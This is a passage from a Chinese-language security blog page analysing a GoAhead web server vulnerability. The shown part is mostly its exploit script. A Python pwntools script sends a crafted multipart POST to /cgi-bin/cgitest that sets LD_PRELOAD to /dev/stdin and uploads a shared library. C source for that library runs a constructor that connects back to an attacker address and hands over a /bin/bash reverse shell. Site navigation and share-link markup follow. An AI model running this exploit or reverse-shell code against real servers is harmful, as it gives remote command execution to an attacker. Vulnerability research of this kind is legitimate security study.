class="line">ip = <span class="string">&#x27;aaa.bbb.ccc.ddd&#x27;</span></span><br><span class="line">port = abcde</span><br><span class="line"><span class="comment">#r_shell_mesg</span></span><br><span class="line">reverse_shell_ip = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">listen_port = <span class="number">7777</span></span><br><span class="line"><span class="comment">#commond</span></span><br><span class="line">cmd = <span class="string">&#x27;/bin/bash&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_so</span>(<span class="params">filepath</span>):</span><br><span class="line">    f = <span class="built_in">open</span>(filepath,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">    f = f.replace(<span class="string">&quot;aaa.bbb.ccc.ddd&quot;</span>,reverse_shell_ip.ljust(<span class="built_in">len</span>(reverse_shell_ip)+<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    f = f.replace(<span class="string">&quot;abcde&quot;</span>,<span class="built_in">str</span>(listen_port).ljust(<span class="built_in">len</span>(<span class="built_in">str</span>(listen_port))+<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> f</span><br><span class="line"></span><br><span class="line">headers = <span class="string">&quot;&quot;&quot;POST /cgi-bin/cgitest HTTP/1.1\r</span></span><br><span class="line"><span class="string">Host: localhost:8080\r</span></span><br><span class="line"><span class="string">Accept: */*\r</span></span><br><span class="line"><span class="string">Connection: close\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=------------------------f74e4c2f448c9827\r</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">body = <span class="string">b&quot;&quot;&quot;--------------------------f74e4c2f448c9827</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;LD_PRELOAD&quot;\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">/dev/stdin\r</span></span><br><span class="line"><span class="string">--------------------------f74e4c2f448c9827--\r</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#/dev/stdin</span></span><br><span class="line"><span class="comment">#/proc/self/fd/0</span></span><br><span class="line"></span><br><span class="line">n = remote(ip,port)</span><br><span class="line">l = listen(listen_port)</span><br><span class="line">post = body + parse_so(<span class="string">&#x27;./tmp.so&#x27;</span>)</span><br><span class="line">n.send(headers.<span class="built_in">format</span>(<span class="built_in">len</span>(post)) + post)</span><br><span class="line">n.close()</span><br><span class="line">l.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* gcc tmp.c -fPIC -shared -s -Os -o tmp.so */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> server_ip[<span class="number">0x10</span>]=<span class="string">&quot;aaa.bbb.ccc.ddd&quot;</span>;</span><br><span class="line"><span class="type">char</span> server_port[<span class="number">8</span>]=<span class="string">&quot;abcde&quot;</span>;</span><br><span class="line"><span class="type">char</span> *pathname=<span class="string">&quot;/bin/bash&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">reverse_shell</span><span class="params">(<span class="type">void</span>)</span> __<span class="title function_">attribute__</span><span class="params">((constructor))</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">reverse_shell</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> sock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">attacker_addr</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  attacker_addr.sin_family = AF_INET;</span><br><span class="line">  attacker_addr.sin_port = htons(atoi(server_port));</span><br><span class="line">  attacker_addr.sin_addr.s_addr = inet_addr(server_ip);</span><br><span class="line">  <span class="keyword">if</span>(connect(sock, (<span class="keyword">struct</span> sockaddr *)&amp;attacker_addr,<span class="keyword">sizeof</span>(attacker_addr))!=<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  dup2(sock, <span class="number">0</span>);</span><br><span class="line">  dup2(sock, <span class="number">1</span>);</span><br><span class="line">  dup2(sock, <span class="number">2</span>);</span><br><span class="line">  execve(pathname, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#base"><span class="toc-number">1.</span> <span class="toc-text">base</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83"><span class="toc-number">2.</span> <span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95"><span class="toc-number">3.1.</span> <span class="toc-text">利用手法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-number">3.2.</span> <span class="toc-text">利用流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC"><span class="toc-number">3.3.</span> <span class="toc-text">脚本</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/10/08/GoAhead%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/10/08/GoAhead%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&text=GoAhead漏洞分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/10/08/GoAhead%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=GoAhead漏洞分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/10/08/GoAhead%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&is_video=false&description=GoAhead漏洞分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=GoAhead漏洞分析&body=Check out this article: http://example.com/2023/10/08/GoAhead%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/10/08/GoAhead%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=GoAhead漏洞分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/10/08/GoAhead%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=GoAhead漏洞分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/10/08/GoAhead%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=GoAhead漏洞分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/10/08/GoAhead%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=GoAhead漏洞分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/10/08/GoAhead%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=GoAhead漏洞分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/10/08/GoAhead%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=GoAhead漏洞分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    nepire
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
